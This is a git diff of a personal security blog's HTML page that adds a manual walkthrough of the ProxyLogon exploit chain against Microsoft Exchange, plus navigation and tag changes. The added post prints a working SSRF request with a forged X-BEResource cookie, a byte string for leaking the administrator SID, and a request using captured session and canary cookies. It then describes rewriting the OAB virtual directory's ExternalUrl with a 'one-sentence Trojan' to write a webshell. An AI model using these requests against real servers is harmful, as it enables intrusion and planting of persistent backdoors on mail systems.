-\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\Current\&lt;any aspx file in this folder or subfolders&gt;
-\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\&lt;folder with version number&gt;\&lt;any aspx file in this folder or subfolders&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.17.png"></p>
+<h3 id="Get-legacydn"><a href="#Get-legacydn" class="headerlink" title="Get legacydn"></a>Get legacydn</h3><pre class="line-numbers language-none"><code class="language-none">Use access to the FQDN, through access to the internal autodiscover&#x2F;autodiscover SSRF. XML to obtain corresponding legacydn email accounts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h6 id="More-Principle-Reference"><a href="#More-Principle-Reference" class="headerlink" title="More Principle Reference"></a>More Principle Reference</h6><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F;
-https:&#x2F;&#x2F;www.praetorian.com&#x2F;blog&#x2F;reproducing-proxylogon-exploit&#x2F;
-https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265
-https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.22.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /ecp/qqq.js HTTP/1.1
+Host: yangsir
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">6.3</span><span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/86.0.4240.75 Safari/537.36
+ConTent-Type: text/xml
+Cookie: X-BEResource<span class="token operator">=</span>YANGDC/autodiscover/autodiscover.xml?a<span class="token operator">=~</span><span class="token number">1942062522</span><span class="token punctuation">;</span>
+Content-Length: <span class="token number">343</span>
+
+<span class="token operator">&lt;</span>Autodiscover <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>Request<span class="token operator">></span>
+      <span class="token operator">&lt;</span>EMailAddress<span class="token operator">></span>administrator@yangsir.git<span class="token operator">&lt;</span>/EMailAddress<span class="token operator">></span> <span class="token operator">&lt;</span>AcceptableResponseSchema<span class="token operator">></span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="token operator">&lt;</span>/AcceptableResponseSchema<span class="token operator">></span>
+    <span class="token operator">&lt;</span>/Request<span class="token operator">></span>
+<span class="token operator">&lt;</span>/Autodiscover<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.31.png"></p>
+<h3 id="Get-sid"><a href="#Get-sid" class="headerlink" title="Get sid"></a>Get sid</h3><pre class="line-numbers language-none"><code class="language-none">Request the &#x2F;mapi&#x2F;emsmdb interface by obtaining the legacyDN combination string, and make it report an error, and return the complete SID
+
+string：\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.38.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">you can get sid like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.59.png"></p>
+<h3 id="Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important"><a href="#Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important" class="headerlink" title="Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)"></a>Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.07.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">this use the proxyLogon interface，you will get these<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2717.15.24.png"></p>
+<h3 id="File-writing"><a href="#File-writing" class="headerlink" title="File writing"></a>File writing</h3><h4 id="Get-oabid"><a href="#Get-oabid" class="headerlink" title="Get oabid"></a>Get oabid</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.30.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: X-BEResource&#x3D;Administrator@YANGDC:444&#x2F;ecp&#x2F;DDI&#x2F;DDIService.svc&#x2F;GetObject?schema&#x3D;OABVirtualDirectory&amp;msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.&amp;a&#x3D;~1942062522; ASP.NET_SessionId&#x3D;e6d5b949-c1a2-4e98-bb5a-65b57526110f; msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.
+
+&#123;&quot;filter&quot;: &#123;&quot;Parameters&quot;: &#123;&quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;All&quot;, &quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;&#125;&#125;, &quot;sort&quot;: &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.39.png"></p>
+<h4 id="Change-the-dir-config"><a href="#Change-the-dir-config" class="headerlink" title="Change the dir config"></a>Change the dir config</h4><pre class="line-numbers language-none"><code class="language-none">The local environment cannot be modified successfully, so change the environment to demonstrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.00.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Change the environment to modify the virtual directory configuration, ExternalUrl for our one-sentence Trojan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.30.png"></p>
+<h4 id="Reset-the-dir"><a href="#Reset-the-dir" class="headerlink" title="Reset the dir"></a>Reset the dir</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.37.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">confirm our webshell name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.06.png"></p>
+<h3 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.29.png"></p>
+
                 
             </div>
             <hr/>
@@ -599,7 +669,7 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/26/proxylogon-utilization-method/">https://yangsirrr.github.io/2021/07/26/proxylogon-utilization-method/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/27/proxylogon-utilization-method-manual-use/">https://yangsirrr.github.io/2021/07/27/proxylogon-utilization-method-manual-use/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -696,9 +766,10 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/07/27/proxylogon-utilization-method-manual-use/">
                     <div class="card-image">
@@ -715,9 +786,9 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -730,6 +801,7 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -760,12 +832,12 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/24/sqlserver-common-attack-methods/">
+                <a href="/2021/07/26/proxylogon-utilization-method/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png" class="responsive-img" alt="Sqlserver common attack methods">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png" class="responsive-img" alt="ProxyLogon Utilization method">
                         
-                        <span class="card-title">Sqlserver common attack methods</span>
+                        <span class="card-title">ProxyLogon Utilization method</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -776,14 +848,14 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                    Miscellaneous record
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
                                 </a>
                             
                             
@@ -797,20 +869,16 @@ https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Information-collection/">
-                        <span class="chip bg-color">Information collection</span>
+                    <a href="/tags/Exchange/">
+                        <span class="chip bg-color">Exchange</span>
                     </a>
                     
-                    <a href="/tags/Sqlserver/">
-                        <span class="chip bg-color">Sqlserver</span>
+                    <a href="/tags/ProxyLogon/">
+                        <span class="chip bg-color">ProxyLogon</span>
                     </a>
                     
-                    <a href="/tags/Database/">
-                        <span class="chip bg-color">Database</span>
-                    </a>
-                    
-                    <a href="/tags/Command-execution/">
-                        <span class="chip bg-color">Command execution</span>
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                 </div>
